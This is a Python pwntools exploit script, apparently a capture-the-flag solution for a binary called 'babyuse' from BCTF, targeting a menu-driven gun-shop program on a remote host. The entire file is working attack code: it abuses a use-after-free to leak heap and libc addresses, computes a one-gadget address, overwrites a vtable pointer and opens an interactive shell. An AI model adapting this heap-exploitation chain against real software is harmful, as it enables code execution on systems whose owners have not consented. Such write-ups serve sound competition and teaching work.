#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "202.112.51.247"
PORT = 3456

def buy(id, lenname, name):
	r.sendline("1")
	r.recvuntil("QBZ95\n")	
	r.sendline(str(id))
	r.recvline()
	r.sendline(str(lenname))
	r.recvline()
	r.sendline(name)

	r.recvuntil("Exit\n")

def selectgun(idx):
	r.sendline("2")
	r.recvuntil("Select a gun\n")
	r.sendline(str(idx))

	r.recvuntil("Exit\n")

def listguns():
	r.sendline("3")	
	r.recvline()
	data = r.recvuntil("Menu:")
	r.recvuntil("Exit\n")

	return data

def renamegun(idx, newlen, newname):
	r.sendline("4")
	r.recvline()
	r.sendline(str(idx))
	r.recvline()
	r.sendline(str(newlen))
	r.recvline()
	r.sendline(newname)
	r.recvuntil("Exit\n")

def usegun(action, dorecv=True):
	r.sendline("5")
	data1 = r.recvline()
	r.recvuntil("menu\n")
	r.sendline(str(action))

	if (dorecv):
		data = r.recvline()
		r.sendline("4")
		r.recvuntil("Exit\n")

		return data1

def dropgun(idx):
	r.sendline("6")
	r.recvline()
	r.sendline(str(idx))
	r.recvuntil("Exit\n")

def info(s):
	log.info(s)

def exploit(r):
	if not Local:
		r.recvline()
		r.sendline("XXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 	# BCTF Token

	r.recvuntil("Exit\n")
	
	buy(1, 10, "AAAABBBBC")
		
	renamegun(0, 8, "AAAABBB")

	dropgun(0)

	HEAPLEAK = u32(usegun(0)[len("Select gun "):-4])

	info("Heap leak        : %s" % hex(HEAPLEAK))

	buy(1, 256, "AAAABBBB")		# 0
	buy(1, 256, "CCCCDDDD")		# 1
	
	dropgun(0)
	
	LIBCLEAK = u32(usegun(0)[len("Select gun "):len("Select gun ")+4])
	LIBC = LIBCLEAK - 0x1b27b0
	ONE = LIBC + 0x3ac69		
	HEAPDEST = HEAPLEAK + 0x2c #  0x5c

	info("LIBC leak        : %s" % hex(LIBCLEAK))
	info("LIBC base        : %s" % hex(LIBC))
	info("One gadget       : %s" % hex(ONE))
	info("HEAP destination : %s" % hex(HEAPDEST))
	
	payload = "AAAA"
	payload += p32(ONE)			# VTable Shoot
	payload += "CCCC"			# VTable Reload
	payload += "DDDD"			# VTable ShowInfo
	payload += "EEEE"

	buy(1, 32, payload)			# 0
	buy(1, 32, "XXXXYYYY")		# 2
	buy(1, 32, "EEEEFFFF")		# 3	
	
	selectgun(2)
	
	dropgun(0)		
	dropgun(2)
	dropgun(3)

	payload = p32(HEAPDEST)	
	payload +=  p32(HEAPDEST)
	
	buy(1, 16, payload)	

	usegun(1, False)

	r.interactive()

	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		Local = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		Local = True
		r = process("./babyuse", env={"LD_PRELOAD" : "./libc.so"})		
		print util.proc.pidof(r)
		pause()
		exploit(r)
    